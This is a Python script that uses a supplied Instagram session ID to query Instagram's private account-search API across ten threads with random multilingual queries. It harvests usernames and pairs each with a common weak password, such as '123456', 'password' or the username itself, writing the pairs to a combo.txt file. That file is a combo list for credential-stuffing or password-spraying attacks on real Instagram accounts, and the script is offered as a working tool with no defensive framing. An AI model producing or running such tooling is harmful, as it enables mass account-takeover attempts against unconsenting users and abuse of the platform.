import os
import threading
import random
from base64 import b64encode
import re
try:
    import requests
    from faker import Faker
except:
    os.system("pip install requests faker")
    import requests   
    from faker import Faker
    
    

ses = input("Enter Your SessionID : ")
user_id = re.match(r"(\d+)", ses).group(1)
Actok = b64encode(f'{{"ds_user_id":"{user_id}","sessionid":"{ses}"}}'.encode('utf-8'))
Arab = Faker("ar_AE")  
English = Faker("en_US")  
French = Faker("fr_FR")  
Spanish = Faker("es_ES")  
German = Faker("de_DE")  
Italian = Faker("it_IT")  
Portuguese = Faker("pt_PT")  
Russian = Faker("ru_RU")  
Chinese = Faker("zh_CN")  
Japanese = Faker("ja_JP")  
Korean = Faker("ko_KR")  
Hindi = Faker("hi_IN")  
Turkish = Faker("tr_TR")  
Persian = Faker("fa_IR")  
headers = {
    'User-Agent': "Instagram 368.0.0.45.96 Android (30/11; 440dpi; 1080x2220; Xiaomi/Redmi; 23127PN0CC; begonia; mt6785; ar_EG; 700073482)",
    'x-bloks-version-id': "dbfb0f84b6481f4ec0a033d7947fb45db546b8cee18dde220c4c1eefd3bb3dcb", 
    'authorization': f"Bearer IGT:2:{Actok.decode('utf-8')}",
    'x-ig-app-id': "567067343352427",  
}
AllEmail = set() 
def more_page(params, pag, ran):
    while True:
        try:
            params.update({
                'next_max_id': pag,
                'rank_token': ran,
                'page_token': pag
            })
            response = requests.get("https://i.instagram.com/api/v1/fbsearch/account_serp/", params=params, headers=headers)
            TnT = response.json()
            usernames = [user['username'] for user in TnT.get('users', [])]          
            for username in usernames:
                if username not in AllEmail:
                	pas= [
                  "123456",
    "12345@@",
     username,
    "qwerqwer",
    "Aa1234",
    "00998877",
    "qqwweerr",
    "1q2w3e4r",
    "1234567",
    "12345678",
    "098765",
    "qwertyuiop",
    "11223344",
    "1122334455",
    "qwer1234",
    "password",
    "mmnnbbvv",
    "ppooiiuu",
    "12345a",
    "123456789"
]

  
                    
                	pasw= random.choice(pas)
                	print(username+'/'+pasw)

                	
                	with open('combo.txt', 'a') as f:
                		f.write(f'{username}:{pasw}'+'\n') 
                else:
                    pass
            if TnT.get('has_more'):
                ran = TnT.get("rank_token")
                pag = TnT.get("page_token")             
            else:
                print("Done See All Page")               
                break
        except Exception as e:
            print(e)           
            
def search():
    while True:
        try:
            kill = random.choice([
            'دجحخهعغفقثصضشسيبلاتنمكطظزوةىلؤءئ',  
            '1234567890azertyuiopmlkjhgfdsqwxcvbn',  
            'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン',
            'あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん',
            'ABCÇDEFGĞHIİJKLMNOÖPRSŞTÜVYZ',  
            'АБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ',  
            'अआइईउऊऋएऐओऔकखगघङचछजझञटठडढणतथदधनपफबभमयरलवशषसहक्षत्रज्ञ',  
            'ابپتثجچحخدذرزژسشصضطظعغفقکگلمنوهی'
            'あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん',
            'अआइईउऊऋएऐओऔअंअःकखगघङचछजझञटठडढणतथदधनपफबभमयरलवशषसहक्षत्रज्ञ',
            'กขฃคฅฆงจฉชซฌญฎฏฐฑฒณดตถทธนบปผฝพฟภมยรฤฤลฦวศษสหฬอฮ',
            'ㅏㅐㅑㅒㅓㅔㅕㅖㅗㅘㅙㅚㅛㅜㅝㅞㅟㅠㅡㅢㅣㄱㄲㄴㄷㄸㄹㅁㅂㅃㅅㅆㅇㅈㅉㅊㅋㅌㅍㅎ',
            'ğüişöçñäüğüişöçñäüğüişöçñäüqw.ertyuiopasdfghjklzxcvbnm',
            'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',
            'абвгдеёжзийклмнопрстуфхцчшщъыьэюя',  'абвгдеёжзийклмнопрстуфхцчшщъыьэюя','абвгдеёжзийклмнопрстуфхцчшщъыьэюя','的一是不了人我在有他这为之大来以个中上们到说时国和地要就出会可也你对生能而子那得于着下自之','的一是不了人我在有他这为之大来以个中上们到说时国和地要就出会可也你对生能而子那得于着下自之','的一是不了人我在有他这为之大来以个中上们到说时国和地要就出会可也你对生能而子那得于着下自之','アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン',  'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン','あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん', 'あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん','אבגדהוזחטיכלמנסעפצקרשת','אבגדהוזחטיכלמנסעפצקרשת','αβγδεζηθικλμνξοπρστυφχψω','αβγδεζηθικλμνξοπρστυφχψω','กขฃคฅฆงจฉชซฌญฎฏฐฑฒณดตถทธนบปผฝพฟภมยรฤฤลฦวศษสหฬอฮ','กขฃคฅฆงจฉชซฌญฎฏฐฑฒณดตถทธนบปผฝพฟภมยรฤฤลฦวศษสหฬอฮ','अआइईउऊऋएऐओऔअंअःकखगघङचछजझञटठडढणतथदधनपफबभमयरलवशषसहक्षत्रज्ञ','अआइईउऊऋएऐओऔअंअःकखगघङचछजझञटठडढणतथदधनपफबभमयरलवशषसहक्षत्रज्ञ','ضصثقفغعهخحجطكمنتالبيسشءذؤرىةوزظد','ذءؤرىةوزظدطكمنتالبيسشضصثقفغعهخحح','جطدظزوةىرؤءذشضصسيبقبفلناهغحاظا','qwertyuioplkjhgfdsazxcvbnm','plmnjkoiuytrewqasdfghjbvcxz','zxcvbnmasdfghjklqwertyuiop','1234567890asdfghjklmnbvcxzqwertyuiop','mnbvcxzasdfghjklpoiuytrewq1478096523'
        ])   
            key = ''.join((random.choice(kill) for _ in range(random.randrange(3, 15))))
            rng = int("".join(random.choice("6789") for _ in range(1)))
            name = "".join(random.choice("1234567890qwertyuiopasdfghjklzxcvbnm.") for _ in range(rng))
            fuck = random.choice([Arab.name(),English.name(),French.name(),Spanish.name(),German.name(),Italian.name(),Portuguese.name(),Russian.name(),Chinese.name(),Japanese.name(),Korean.name(),Hindi.name(),Turkish.name(),Persian.name()])
            nmn = random.choice([Arab.user_name(),English.user_name(),French.user_name(),Spanish.user_name(),German.user_name(),Italian.user_name(),Portuguese.user_name(),Russian.user_name(),Chinese.user_name(),Japanese.user_name(),Korean.user_name(),Hindi.user_name(),Turkish.user_name(),Persian.user_name()])
            usery = random.choice([name, key, fuck, nmn])      	
            params = {
                'search_surface': "user_serp",
                'timezone_offset': "10800",
                'enable_metadata': "false",
                'count': "30",
                'query': usery,
                'disable_ads': "false"
            }          
            response = requests.get("https://i.instagram.com/api/v1/fbsearch/account_serp/", params=params, headers=headers)
            TnT = response.json()
            usernames = [user['username'] for user in TnT.get('users', [])]
              
            for username in usernames:
                if username not in AllEmail:
                	pas= [
                  "123456",
    "12345@@",
     username,
    "qwerqwer",
    "Aa1234",
    "00998877",
    "qqwweerr",
    "1q2w3e4r",
    "1234567",
    "12345678",
    "098765",
    "qwertyuiop",
    "11223344",
    "1122334455",
    "qwer1234",
    "password",
    "mmnnbbvv",
    "ppooiiuu",
    "12345a",
    "123456789"
]

  
                    
                	pasw= random.choice(pas)
                	print(username+'/'+pasw)

                	
                	with open('combo.txt', 'a') as f:
                		f.write(f'{username}:{pasw}'+'\n') 
                else:
                    pass
            if TnT.get('has_more'):
                ran = TnT.get("rank_token")
                pag = TnT.get("page_token")            
                more_page(params, pag, ran)
            else:
                print("No User")
                
        except Exception as e:
            print(e)
            pass
        
  
threads = []
for i in range(10):
    t = threading.Thread(target=search)
    threads.append(t)
    t.start()
for t in threads:
    t.join()      
